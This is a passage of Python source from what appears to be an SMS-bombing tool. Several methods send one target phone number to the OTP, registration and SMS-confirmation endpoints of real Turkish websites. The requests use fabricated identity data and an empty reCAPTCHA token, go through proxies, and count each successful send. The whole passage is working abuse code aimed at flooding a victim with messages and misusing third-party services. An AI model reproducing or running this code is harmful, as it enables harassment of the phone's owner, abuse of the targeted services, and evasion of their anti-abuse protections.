            data = f"--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{tc_dummy}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n{self.f_birth_dot}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\n{self.f_ad.upper()}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\n{self.f_soyad.upper()}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\n{self.f_sifre}\r\n--{bound}--\r\n"
            r = self.session.post(url, headers=headers, data=data, timeout=8, verify=False, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 37 [bayrampasa.bel.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 37 [bayrampasa.bel.tr]: {self.phone} ({e})")

    def _srv_38(self):
        try:
            self.randomize()
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
            r = self.session.post(url, data=data, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("resultType") == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 38 [money.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 38 [money.com.tr]: {self.phone} ({e})")

    def _srv_39(self):
        try:
            self.randomize()
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            json={"Phone": self.phone, "XID": ""}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 39 [alixavien.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 39 [alixavien.com]: {self.phone} ({e})")

    def _srv_40(self):
        try:
            self.randomize()
            r = self.session.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}", timeout=10, proxies=self.proxies)
            if self._get_json(r).get("Sonuc") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 40 [jimmykey.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 40 [jimmykey.com]: {self.phone} ({e})")
        
    def _srv_41(self):
        try:
            self.randomize()
            url = "https://api.ido.com.tr:443/idows/v2/register"
            json={"birthDate": True, "day": self.f_birth_day, "email": self.mail, "firstName": self.f_ad.upper(), "gender": choice(["MALE", "FEMALE"]), "lastName": self.f_soyad.upper(), "mobileNumber": f"0{self.phone}", "month": self.f_birth_month, "pwd": self.f_sifre, "year": self.f_birth_year}
            r = self.session.post(url, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 41 [ido.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 41 [ido.com.tr]: {self.phone} ({e})")